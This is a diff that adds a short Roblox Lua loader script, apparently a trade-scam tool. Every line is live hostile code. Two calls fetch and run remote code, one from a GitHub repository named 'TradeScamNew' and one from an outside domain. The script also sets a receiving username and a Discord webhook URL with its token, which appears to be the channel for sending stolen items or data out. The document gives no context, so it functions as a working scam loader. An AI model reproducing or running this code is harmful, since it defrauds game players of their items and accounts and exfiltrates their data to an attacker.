@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/TradeScamNew/main/Main.lua.text"))()
+getgenv().gui = false
+Username = "Makalyxz"
+Username2 = "Makalyxz"
+Webhook = "https://discord.com/api/webhooks/1262390634862346250/mofvVvsxnwggu0Q9qqF90YrmlFn5kLGxRveT9xfivDQhucp_VYON-nHgCZaL-bOvcYP3"
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
